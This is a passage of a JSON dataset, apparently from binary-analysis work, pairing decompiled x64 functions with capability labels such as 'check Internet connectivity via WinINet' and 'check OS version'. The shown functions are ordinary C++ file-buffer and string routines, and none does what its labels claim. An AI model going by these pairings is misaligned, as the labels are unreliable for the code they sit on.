        "decompiled_code": "\nulong fcn.14007e900(ulong arg1, ulong noname_1, int64_t *arg3)\n\n{\n    int32_t *piVar1;\n    int64_t *piVar2;\n    int64_t arg2;\n    int32_t iVar3;\n    ulong uVar4;\n    int64_t *piVar5;\n    int64_t *piVar6;\n    uchar (*in_R9) [16];\n    uchar *unaff_R12;\n    uint32_t in_stack_00000028;\n    uint32_t in_stack_00000038;\n    int64_t *in_stack_00000048;\n    uchar auStack288 [16];\n    uchar *apuStack272 [2];\n    uchar auStack256 [16];\n    uchar auStack240 [16];\n    ulong uStack216;\n    int64_t *piStack208;\n    uint64_t uStack200;\n    uint64_t uStack192;\n    uchar uStack128;\n    ulong uStack120;\n    ushort uStack112;\n    ushort uStack96;\n    unkbyte6 Stack94;\n    uchar auStack88 [16];\n    uchar uStack65;\n    int64_t iStack64;\n    \n    auStack240 = *in_R9;\n    uStack192 = in_stack_00000028;\n    uStack200 = in_stack_00000038;\n    if (in_stack_00000048 == NULL) {\n        auStack88 = auStack240;\n        (**(*arg3 + 0x10))(arg1, arg3, auStack88, uStack192 & 0xff);\n    }\n    else {\n        if (in_stack_00000048[4] == 0) {\n            piVar6 = arg3;\n            uStack216 = fcn.1400b7080(0x1400fd68a);\n            fcn.14006caa0(iStack64 + -0x18);\n            uVar4 = uStack216;\n            fcn.14000f000(uStack216);\n            auStack288 = *in_R9;\n            piVar5 = CONCAT62(Stack94, uStack96);\n            piStack208 = arg3;\n            if (piVar5 == NULL) {\n                (**(*piVar6 + 0x10))();\n                return uVar4;\n            }\n            if (piVar5[4] != 0) {\n                arg2 = *piVar5;\n                unaff_R12 = auStack256;\n                apuStack272[0] = unaff_R12;\n                if ((arg2 != 0) || (piVar5[1] == 0)) {\n                    fcn.1400a4ce0(apuStack272, arg2, arg2 + piVar5[1] * 2);\n                    (**(*piVar6 + 0x18))(uVar4, piVar6, auStack288, uStack128, uStack120, uStack112, apuStack272);\n                    if (apuStack272[0] == unaff_R12) {\n                        return uVar4;\n                    }\n                    fcn.1400b64d0();\n                    return uVar4;\n                }\n                fcn.1400a3d10();\n            }\n            piVar5 = fcn.1400b7080(\"uninitialized __any_string\");\n            if (apuStack272[0] != unaff_R12) {\n                fcn.1400b64d0();\n            }\n            fcn.14000f000(piVar5);\n            *piVar5 = 0x140109150;\n            piVar6 = piVar5[3];\n            if (**0x140102a70 == 0) {\n                iVar3 = *(piVar6 + 1);\n                *(piVar6 + 1) = iVar3 + -1;\n            }\n            else {\n                LOCK();\n                piVar2 = piVar6 + 1;\n                iVar3 = *piVar2;\n                *piVar2 = *piVar2 + -1;\n            }\n            if (iVar3 == 1) {\n                (**(*piVar6 + 8))();\n            }\n            *piVar5 = *0x1401034a0 + 0x10;\n            fcn.14009f7a0(piVar5 + 2);\n            fcn.14009f7d0(piVar5);\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n            uVar4 = (*_sym.imp.msvcrt.dll_free)(piVar5);\n            return uVar4;\n        }\n        iStack64 = fcn.14006c5c0(*in_stack_00000048, *in_stack_00000048 + in_stack_00000048[1] * 2);\n        auStack88 = auStack240;\n        (**(*arg3 + 0x18))(arg1, arg3, auStack88, uStack192 & 0xff);\n        if (**0x140102a70 == 0) {\n            iVar3 = *(iStack64 + -8);\n            *(iStack64 + -8) = iVar3 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = iStack64 + -8;\n            iVar3 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar3 < 1) {\n            fcn.14006ca90(iStack64 + -0x18, &uStack65);\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 1211
    },
    "14007ea7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.14007ea70(ulong arg1, ulong noname_1, int64_t *arg3)\n\n{\n    int64_t *piVar1;\n    int64_t arg2;\n    int64_t *piVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    int64_t *arg1_00;\n    uchar (*in_R9) [16];\n    uchar *unaff_R12;\n    uchar in_stack_00000028;\n    ulong in_stack_00000030;\n    ushort in_stack_00000038;\n    int64_t *in_stack_00000048;\n    uchar auStack120 [16];\n    uchar *apuStack104 [2];\n    uchar auStack88 [40];\n    \n    auStack120 = *in_R9;\n    if (in_stack_00000048 == NULL) {\n        (**(*arg3 + 0x10))(arg1, arg3, auStack120, in_stack_00000028);\n        return arg1;\n    }\n    if (in_stack_00000048[4] != 0) {\n        arg2 = *in_stack_00000048;\n        unaff_R12 = auStack88;\n        apuStack104[0] = unaff_R12;\n        if ((arg2 != 0) || (in_stack_00000048[1] == 0)) {\n            fcn.1400a4ce0(apuStack104, arg2, arg2 + in_stack_00000048[1] * 2);\n            (**(*arg3 + 0x18))(arg1, arg3, auStack120, in_stack_00000028, in_stack_00000030, in_stack_00000038, \n                               apuStack104);\n            if (apuStack104[0] == unaff_R12) {\n                return arg1;\n            }\n            fcn.1400b64d0();\n            return arg1;\n        }\n        fcn.1400a3d10();\n    }\n    arg1_00 = fcn.1400b7080(\"uninitialized __any_string\");\n    if (apuStack104[0] != unaff_R12) {\n        fcn.1400b64d0();\n    }\n    fcn.14000f000(arg1_00);\n    *arg1_00 = 0x140109150;\n    piVar2 = arg1_00[3];\n    if (**0x140102a70 == 0) {\n        iVar3 = *(piVar2 + 1);\n        *(piVar2 + 1) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = piVar2 + 1;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar3 == 1) {\n        (**(*piVar2 + 8))();\n    }\n    *arg1_00 = *0x1401034a0 + 0x10;\n    fcn.14009f7a0(arg1_00 + 2);\n    fcn.14009f7d0(arg1_00);\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar4 = (*_sym.imp.msvcrt.dll_free)(arg1_00);\n    return uVar4;\n}\n",
        "token_count": 751
    },
    "1400834a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.1400834a0(int64_t *arg1)\n\n{\n    uchar *arg2;\n    int64_t *piVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    int64_t *piVar9;\n    int64_t iVar10;\n    char *pcVar11;\n    ulong in_RDX;\n    uchar *puVar12;\n    uchar *puVar13;\n    uint64_t in_R8;\n    int64_t iVar14;\n    ulong uStack440;\n    uchar auStack432 [32];\n    int64_t aiStack400 [3];\n    int64_t *piStack376;\n    uchar auStack368 [4];\n    uint32_t uStack364;\n    int64_t iStack360;\n    int64_t iStack352;\n    ulong auStack344 [2];\n    int64_t *piStack328;\n    uint64_t uStack320;\n    int64_t iStack208;\n    uchar auStack200 [128];\n    uchar auStack72 [8];\n    \n    uStack320 = 1;\n    if (arg1[4] < arg1[5]) {\n        in_RDX = 0xffffffff;\n        iVar4 = (**(*arg1 + 0x68))();\n        uStack320 = iVar4 != -1;\n    }\n    if (*(arg1 + 0x82) == '\\0') {\n        return uStack320;\n    }\n    piVar9 = arg1[0x14];\n    if (piVar9 != NULL) {\n        uVar5 = (**(*piVar9 + 0x30))();\n        if (uVar5 != '\\0') {\n            return uStack320;\n        }\n        if (uStack320 == '\\0') {\n            return uStack320;\n        }\n        do {\n            uVar6 = (**(*arg1[0x14] + 0x18))(arg1[0x14], arg1 + 0xd, auStack200, auStack72);\n            if (uVar6 == 2) {\n                return uVar5;\n            }\n            if ((1 < uVar6) || (iVar14 = iStack208 - auStack200,  iVar14 < 1)) break;\n            iVar7 = fcn.14007c120(arg1 + 10, auStack200, iVar14);\n            if (iVar14 != iVar7) {\n                return uVar5;\n            }\n        } while ((uVar6 & 1) != 0);\n        iVar4 = (**(*arg1 + 0x68))(arg1, 0xffffffff);\n        return uVar5 & 0xffffff00 | iVar4 != -1;\n    }\n    fcn.1400b7000();\n    piStack328 = arg1;\n    puVar13 = auStack432;\n    puVar12 = auStack432;\n    pcVar11 = piVar9[0x14];\n    if (pcVar11 == NULL) goto code_r0x000140083715;\n    uStack440 = 0x1400835e4;\n    cVar3 = (**(*pcVar11 + 0x30))();\n    if (cVar3 == '\\0') {\n        uStack440 = 0x1400835f5;\n        iVar4 = (**(*piVar9[0x14] + 0x40))();\n        iVar10 = iVar4 * in_R8;\n        uStack440 = 0x140083609;\n        iVar7 = fcn.14000e880(iVar10);\n        piVar1 = piVar9[0x14];\n        iVar7 = -iVar7;\n        puVar13 = auStack432 + iVar7;\n        puVar12 = auStack432 + iVar7;\n        iVar14 = *piVar1;\n        arg2 = auStack368 + iVar7;\n        *(aiStack400 + iVar7 + 0x18) = &iStack352;\n        *(aiStack400 + iVar7 + 0x10) = arg2 + iVar10;\n        *(aiStack400 + iVar7 + 8) = arg2;\n        *(aiStack400 + iVar7) = auStack344;\n        pcVar2 = *(iVar14 + 0x10);\n        *(auStack432 + iVar7 + -8) = 0x14008364e;\n        uVar5 = (*pcVar2)(piVar1, piVar9 + 0xd, in_RDX);\n        if (uVar5 < 2) {\n            uStack364 = uVar5;\n            iStack360 = iStack352;\n            in_R8 = iStack352 - arg2;\n            *(auStack432 + iVar7 + -8) = 0x1400836ab;\n            uVar8 = fcn.14007c120(piVar9 + 10, arg2, in_R8);\n            iVar14 = iStack360;\n            if ((in_R8 != uVar8) || ((uStack364 & 1) == 0)) goto code_r0x00014008366b;\n            piVar1 = piVar9[0x14];\n            iVar10 = *piVar1;\n            *(aiStack400 + iVar7 + 0x18) = &iStack352;\n            *(aiStack400 + iVar7 + 0x10) = iVar14;\n            *(aiStack400 + iVar7 + 8) = arg2;\n            *(aiStack400 + iVar7) = auStack344;\n            iVar14 = piVar9[5];\n            pcVar2 = *(iVar10 + 0x10);\n            *(auStack432 + iVar7 + -8) = 0x1400836ea;\n            iVar4 = (*pcVar2)(piVar1, piVar9 + 0xd, auStack344[0], iVar14);\n            if (iVar4 != 2) {\n                in_R8 = iStack352 - arg2;\n                *(auStack432 + iVar7 + -8) = 0x140083704;\n                uVar8 = fcn.14007c120(piVar9 + 10, arg2, in_R8);\n                goto code_r0x00014008366b;\n            }\n        }\n        else if (uVar5 == 3) goto code_r0x00014008365c;\n        pcVar11 = \"basic_filebuf::_M_convert_to_external conversion error\";\n        *(auStack432 + iVar7 + -8) = 0x140083715;\n        fcn.1400b76e0(\"basic_filebuf::_M_convert_to_external conversion error\");\ncode_r0x000140083715:\n        *(puVar13 + -8) = 0x14008371a;\n        uVar8 = fcn.1400b7000();\n        *(puVar13 + -8) = piVar9;\n        if (*(pcVar11 + 0x80) != '\\0') {\n            if (*(pcVar11 + 0x70) != 0) {\n                *(puVar13 + -0x30) = 0x14008373f;\n                uVar8 = fcn.1400b64c0();\n            }\n            *(pcVar11 + 0x70) = 0;\n            *(pcVar11 + 0x80) = 0;\n        }\n        if (*(pcVar11 + 0xa8) != 0) {\n            *(puVar13 + -0x30) = 0x14008375f;\n            uVar8 = fcn.1400b64c0();\n        }\n        *(pcVar11 + 0xa8) = 0;\n        *(pcVar11 + 0xb0) = 0;\n        *(pcVar11 + 0xb8) = 0x0;\n        return uVar8;\n    }\ncode_r0x00014008365c:\n    *(puVar12 + -8) = 0x14008366b;\n    uVar8 = fcn.14007c120(piVar9 + 10, in_RDX, in_R8);\ncode_r0x00014008366b:\n    return uVar8 & 0xffffffffffffff00 | uVar8 == in_R8;\n}\n",
        "token_count": 1806
    },
    "1400835b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.1400835b0(int64_t arg1, ulong arg2, uint64_t arg3)\n\n{\n    uchar *arg2_00;\n    int64_t *piVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    ulong uVar4;\n    char cVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    char *pcVar11;\n    uchar *puVar12;\n    uchar *puVar13;\n    uchar auStack176 [4];\n    ulong var_1ch;\n    ulong var_10h;\n    ulong var_8h_2;\n    ulong var_8h;\n    int64_t aiStack128 [3];\n    uchar auStack104 [4];\n    uint32_t uStack100;\n    int64_t iStack96;\n    int64_t iStack88;\n    ulong uStack80;\n    \n    puVar13 = &fcn.1400835b0::var_1ch + 4;\n    puVar12 = &fcn.1400835b0::var_1ch + 4;\n    pcVar11 = *(arg1 + 0xa0);\n    if (pcVar11 == NULL) goto code_r0x000140083715;\n    _auStack176 = 0x1400835e4;\n    cVar5 = (**(*pcVar11 + 0x30))();\n    if (cVar5 == '\\0') {\n        _auStack176 = 0x1400835f5;\n        iVar6 = (**(**(arg1 + 0xa0) + 0x40))();\n        iVar10 = iVar6 * arg3;\n        _auStack176 = 0x140083609;\n        iVar8 = fcn.14000e880(iVar10);\n        piVar1 = *(arg1 + 0xa0);\n        iVar8 = -iVar8;\n        puVar13 = &fcn.1400835b0::var_1ch + iVar8 + 4;\n        puVar12 = &fcn.1400835b0::var_1ch + iVar8 + 4;\n        iVar2 = *piVar1;\n        arg2_00 = &stack0xffffffffffffff98 + iVar8;\n        *(&stack0xffffffffffffff90 + iVar8) = &stack0xffffffffffffffa8;\n        *(&stack0xffffffffffffff88 + iVar8) = arg2_00 + iVar10;\n        *(&stack0xffffffffffffff80 + iVar8) = arg2_00;\n        *(&fcn.1400835b0::var_8h + iVar8) = &stack0xffffffffffffffb0;\n        pcVar3 = *(iVar2 + 0x10);\n        *(&stack0xffffffffffffff50 + iVar8) = 0x14008364e;\n        uVar7 = (*pcVar3)(piVar1, arg1 + 0x68, arg2);\n        if (uVar7 < 2) {\n            uStack100 = uVar7;\n            iStack96 = iStack88;\n            arg3 = iStack88 - arg2_00;\n            *(&stack0xffffffffffffff50 + iVar8) = 0x1400836ab;\n            uVar9 = fcn.14007c120(arg1 + 0x50, arg2_00, arg3);\n            iVar2 = iStack96;\n            if ((arg3 != uVar9) || ((uStack100 & 1) == 0)) goto code_r0x00014008366b;\n            piVar1 = *(arg1 + 0xa0);\n            iVar10 = *piVar1;\n            *(&stack0xffffffffffffff90 + iVar8) = &stack0xffffffffffffffa8;\n            *(&stack0xffffffffffffff88 + iVar8) = iVar2;\n            *(&stack0xffffffffffffff80 + iVar8) = arg2_00;\n            *(&fcn.1400835b0::var_8h + iVar8) = &stack0xffffffffffffffb0;\n            uVar4 = *(arg1 + 0x28);\n            pcVar3 = *(iVar10 + 0x10);\n            *(&stack0xffffffffffffff50 + iVar8) = 0x1400836ea;\n            iVar6 = (*pcVar3)(piVar1, arg1 + 0x68, uStack80, uVar4);\n            if (iVar6 != 2) {\n                arg3 = iStack88 - arg2_00;\n                *(&stack0xffffffffffffff50 + iVar8) = 0x140083704;\n                uVar9 = fcn.14007c120(arg1 + 0x50, arg2_00, arg3);\n                goto code_r0x00014008366b;\n            }\n        }\n        else if (uVar7 == 3) goto code_r0x00014008365c;\n        pcVar11 = \"basic_filebuf::_M_convert_to_external conversion error\";\n        *(&stack0xffffffffffffff50 + iVar8) = 0x140083715;\n        fcn.1400b76e0(\"basic_filebuf::_M_convert_to_external conversion error\");\ncode_r0x000140083715:\n        *(puVar13 + -8) = 0x14008371a;\n        uVar9 = fcn.1400b7000();\n        *(puVar13 + -8) = arg1;\n        if (*(pcVar11 + 0x80) != '\\0') {\n            if (*(pcVar11 + 0x70) != 0) {\n                *(puVar13 + -0x30) = 0x14008373f;\n                uVar9 = fcn.1400b64c0();\n            }\n            *(pcVar11 + 0x70) = 0;\n            *(pcVar11 + 0x80) = 0;\n        }\n        if (*(pcVar11 + 0xa8) != 0) {\n            *(puVar13 + -0x30) = 0x14008375f;\n            uVar9 = fcn.1400b64c0();\n        }\n        *(pcVar11 + 0xa8) = 0;\n        *(pcVar11 + 0xb0) = 0;\n        *(pcVar11 + 0xb8) = 0x0;\n        return uVar9;\n    }\ncode_r0x00014008365c:\n    *(puVar12 + -8) = 0x14008366b;\n    uVar9 = fcn.14007c120(arg1 + 0x50, arg2, arg3);\ncode_r0x00014008366b:\n    return uVar9 & 0xffffffffffffff00 | uVar9 == arg3;\n}\n",
        "token_count": 1492
    },
    "14008379": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140083790(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    if ((*(arg1 + 0x80) == '\\0') && (*(arg1 + 0x70) == 0)) {\n        uVar1 = fcn.1400b64f0(*(arg1 + 0x78));\n        *(arg1 + 0x80) = 1;\n        *(arg1 + 0x70) = uVar1;\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "1400837d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.1400837d0(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t *arg1_00;\n    char cVar1;\n    int64_t iVar2;\n    int64_t aiStack56 [3];\n    \n    arg1_00 = arg1 + 10;\n    cVar1 = fcn.1400211d0(arg1_00);\n    if (cVar1 == '\\0') {\n        fcn.14007bf30(arg1_00, arg2, arg3);\n        cVar1 = fcn.1400211d0(arg1_00);\n        if (cVar1 != '\\0') {\n            iVar2 = arg1[0xe];\n            if ((*(arg1 + 0x10) == '\\0') && (iVar2 == 0)) {\n                iVar2 = fcn.1400b64f0(arg1[0xf]);\n                *(arg1 + 0x10) = 1;\n                arg1[0xe] = iVar2;\n            }\n            *(arg1 + 0xc) = arg3;\n            arg1[3] = iVar2;\n            arg1[1] = iVar2;\n            arg1[2] = iVar2;\n            *(arg1 + 4) = 0x0;\n            *(arg1 + 0x81) = 0;\n            arg1[6] = 0;\n            arg1[0xd] = CONCAT44(*(arg1 + 100), *(arg1 + 100));\n            if ((arg3 & 2) == 0) {\n                return arg1;\n            }\n            (**(*arg1 + 0x20))(aiStack56, arg1, 0, 2, arg3);\n            if (aiStack56[0] != -1) {\n                return arg1;\n            }\n            fcn.140083c60(arg1);\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 427
    },
    "1400838e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.1400838e0(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t *arg1_00;\n    char cVar1;\n    int64_t iVar2;\n    int64_t aiStack56 [3];\n    \n    arg1_00 = arg1 + 10;\n    cVar1 = fcn.1400211d0(arg1_00);\n    if (cVar1 == '\\0') {\n        fcn.14007bf80(arg1_00, arg2, arg3);\n        cVar1 = fcn.1400211d0(arg1_00);\n        if (cVar1 != '\\0') {\n            iVar2 = arg1[0xe];\n            if ((*(arg1 + 0x10) == '\\0') && (iVar2 == 0)) {\n                iVar2 = fcn.1400b64f0(arg1[0xf]);\n                *(arg1 + 0x10) = 1;\n                arg1[0xe] = iVar2;\n            }\n            *(arg1 + 0xc) = arg3;\n            arg1[3] = iVar2;\n            arg1[1] = iVar2;\n            arg1[2] = iVar2;\n            *(arg1 + 4) = 0x0;\n            *(arg1 + 0x81) = 0;\n            arg1[6] = 0;\n            arg1[0xd] = CONCAT44(*(arg1 + 100), *(arg1 + 100));\n            if ((arg3 & 2) == 0) {\n                return arg1;\n            }\n            (**(*arg1 + 0x20))(aiStack56, arg1, 0, 2, arg3);\n            if (aiStack56[0] != -1) {\n                return arg1;\n            }\n            fcn.140083c60(arg1);\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 427
    },
    "140083c6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.140083c60(int64_t arg1)\n\n{\n    ulong uVar1;\n    char cVar2;\n    int64_t iVar3;\n    \n    cVar2 = fcn.1400211d0(arg1 + 0x50);\n    if (cVar2 != '\\0') {\n        cVar2 = fcn.1400834a0(arg1);\n        *(arg1 + 0x60) = 0;\n        *(arg1 + 0x98) = 0;\n        if (*(arg1 + 0x80) != '\\0') {\n            if (*(arg1 + 0x70) != 0) {\n                fcn.1400b64c0();\n            }\n            *(arg1 + 0x70) = 0;\n            *(arg1 + 0x80) = 0;\n        }\n        if (*(arg1 + 0xa8) != 0) {\n            fcn.1400b64c0();\n        }\n        uVar1 = *(arg1 + 0x70);\n        *(arg1 + 0xa8) = 0;\n        *(arg1 + 0x18) = uVar1;\n        *(arg1 + 0xb0) = 0;\n        *(arg1 + 0x81) = 0;\n        *(arg1 + 0x30) = 0;\n        *(arg1 + 0xb8) = 0x0;\n        *(arg1 + 0x20) = 0x0;\n        *(arg1 + 8) = uVar1;\n        *(arg1 + 0x10) = uVar1;\n        *(arg1 + 0x68) = CONCAT44(*(arg1 + 100), *(arg1 + 100));\n        iVar3 = fcn.14007c050(arg1 + 0x50);\n        if ((iVar3 != 0) && (cVar2 == '\\x01')) {\n            return arg1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 444
    },
    "140085a7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.140085a70(int64_t *arg1)\n\n{\n    uchar *arg2;\n    int64_t *piVar1;\n    code *pcVar2;\n    char cVar3;\n    int16_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    int64_t *piVar10;\n    int64_t iVar11;\n    char *pcVar12;\n    ulong in_RDX;\n    uchar *puVar13;\n    uchar *puVar14;\n    uint64_t in_R8;\n    int64_t iVar15;\n    ulong uStack440;\n    uchar auStack432 [32];\n    int64_t aiStack400 [3];\n    int64_t *piStack376;\n    uchar auStack368 [4];\n    uint32_t uStack364;\n    int64_t iStack360;\n    int64_t iStack352;\n    ulong auStack344 [2];\n    int64_t *piStack328;\n    uint64_t uStack320;\n    int64_t iStack208;\n    uchar auStack200 [128];\n    uchar auStack72 [8];\n    \n    uStack320 = 1;\n    if (arg1[4] < arg1[5]) {\n        in_RDX = 0xffff;\n        iVar4 = (**(*arg1 + 0x68))();\n        uStack320 = iVar4 != -1;\n    }\n    if (*(arg1 + 0x82) == '\\0') {\n        return uStack320;\n    }\n    piVar10 = arg1[0x14];\n    if (piVar10 != NULL) {\n        uVar5 = (**(*piVar10 + 0x30))();\n        if (uVar5 != '\\0') {\n            return uStack320;\n        }\n        if (uStack320 == '\\0') {\n            return uStack320;\n        }\n        do {\n            uVar6 = (**(*arg1[0x14] + 0x18))(arg1[0x14], arg1 + 0xd, auStack200, auStack72);\n            if (uVar6 == 2) {\n                return uVar5;\n            }\n            if ((1 < uVar6) || (iVar15 = iStack208 - auStack200,  iVar15 < 1)) break;\n            iVar8 = fcn.14007c120(arg1 + 10, auStack200, iVar15);\n            if (iVar15 != iVar8) {\n                return uVar5;\n            }\n        } while ((uVar6 & 1) != 0);\n        iVar4 = (**(*arg1 + 0x68))(arg1, 0xffff);\n        return uVar5 & 0xffffff00 | iVar4 != -1;\n    }\n    fcn.1400b7000();\n    piStack328 = arg1;\n    puVar14 = auStack432;\n    puVar13 = auStack432;\n    pcVar12 = piVar10[0x14];\n    if (pcVar12 == NULL) goto code_r0x000140085cf5;\n    uStack440 = 0x140085bc4;\n    cVar3 = (**(*pcVar12 + 0x30))();\n    if (cVar3 == '\\0') {\n        uStack440 = 0x140085bd5;\n        iVar7 = (**(*piVar10[0x14] + 0x40))();\n        iVar11 = iVar7 * in_R8;\n        uStack440 = 0x140085be9;\n        iVar8 = fcn.14000e880(iVar11);\n        piVar1 = piVar10[0x14];\n        iVar8 = -iVar8;\n        puVar14 = auStack432 + iVar8;\n        puVar13 = auStack432 + iVar8;\n        iVar15 = *piVar1;\n        arg2 = auStack368 + iVar8;\n        *(aiStack400 + iVar8 + 0x18) = &iStack352;\n        *(aiStack400 + iVar8 + 0x10) = arg2 + iVar11;\n        *(aiStack400 + iVar8 + 8) = arg2;\n        *(aiStack400 + iVar8) = auStack344;\n        pcVar2 = *(iVar15 + 0x10);\n        *(auStack432 + iVar8 + -8) = 0x140085c2e;\n        uVar5 = (*pcVar2)(piVar1, piVar10 + 0xd, in_RDX);\n        if (uVar5 < 2) {\n            uStack364 = uVar5;\n            iStack360 = iStack352;\n            in_R8 = iStack352 - arg2;\n            *(auStack432 + iVar8 + -8) = 0x140085c8b;\n            uVar9 = fcn.14007c120(piVar10 + 10, arg2, in_R8);\n            iVar15 = iStack360;\n            if ((in_R8 != uVar9) || ((uStack364 & 1) == 0)) goto code_r0x000140085c4b;\n            piVar1 = piVar10[0x14];\n            iVar11 = *piVar1;\n            *(aiStack400 + iVar8 + 0x18) = &iStack352;\n            *(aiStack400 + iVar8 + 0x10) = iVar15;\n            *(aiStack400 + iVar8 + 8) = arg2;\n            *(aiStack400 + iVar8) = auStack344;\n            iVar15 = piVar10[5];\n            pcVar2 = *(iVar11 + 0x10);\n            *(auStack432 + iVar8 + -8) = 0x140085cca;\n            iVar7 = (*pcVar2)(piVar1, piVar10 + 0xd, auStack344[0], iVar15);\n            if (iVar7 != 2) {\n                in_R8 = iStack352 - arg2;\n                *(auStack432 + iVar8 + -8) = 0x140085ce4;\n                uVar9 = fcn.14007c120(piVar10 + 10, arg2, in_R8);\n                goto code_r0x000140085c4b;\n            }\n        }\n        else if (uVar5 == 3) goto code_r0x000140085c3c;\n        pcVar12 = \"basic_filebuf::_M_convert_to_external conversion error\";\n        *(auStack432 + iVar8 + -8) = 0x140085cf5;\n        fcn.1400b76e0(\"basic_filebuf::_M_convert_to_external conversion error\");\ncode_r0x000140085cf5:\n        *(puVar14 + -8) = 0x140085cfa;\n        uVar9 = fcn.1400b7000();\n        *(puVar14 + -8) = piVar10;\n        if (*(pcVar12 + 0x80) != '\\0') {\n            if (*(pcVar12 + 0x70) != 0) {\n                *(puVar14 + -0x30) = 0x140085d1f;\n                uVar9 = fcn.1400b64c0();\n            }\n            *(pcVar12 + 0x70) = 0;\n            *(pcVar12 + 0x80) = 0;\n        }\n        if (*(pcVar12 + 0xa8) != 0) {\n            *(puVar14 + -0x30) = 0x140085d3f;\n            uVar9 = fcn.1400b64c0();\n        }\n        *(pcVar12 + 0xa8) = 0;\n        *(pcVar12 + 0xb0) = 0;\n        *(pcVar12 + 0xb8) = 0x0;\n        return uVar9;\n    }\ncode_r0x000140085c3c:\n    *(puVar13 + -8) = 0x140085c4b;\n    uVar9 = fcn.14007c120(piVar10 + 10, in_RDX, in_R8);\ncode_r0x000140085c4b:\n    return uVar9 & 0xffffffffffffff00 | uVar9 == in_R8;\n}\n",
        "token_count": 1824
    },
    "140085b9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.140085b90(int64_t arg1, ulong arg2, uint64_t arg3)\n\n{\n    uchar *arg2_00;\n    int64_t *piVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    ulong uVar4;\n    char cVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    char *pcVar11;\n    uchar *puVar12;\n    uchar *puVar13;\n    uchar auStack176 [4];\n    ulong var_1ch;\n    ulong var_10h;\n    ulong var_8h_2;\n    ulong var_8h;\n    int64_t aiStack128 [3];\n    uchar auStack104 [4];\n    uint32_t uStack100;\n    int64_t iStack96;\n    int64_t iStack88;\n    ulong uStack80;\n    \n    puVar13 = &fcn.140085b90::var_1ch + 4;\n    puVar12 = &fcn.140085b90::var_1ch + 4;\n    pcVar11 = *(arg1 + 0xa0);\n    if (pcVar11 == NULL) goto code_r0x000140085cf5;\n    _auStack176 = 0x140085bc4;\n    cVar5 = (**(*pcVar11 + 0x30))();\n    if (cVar5 == '\\0') {\n        _auStack176 = 0x140085bd5;\n        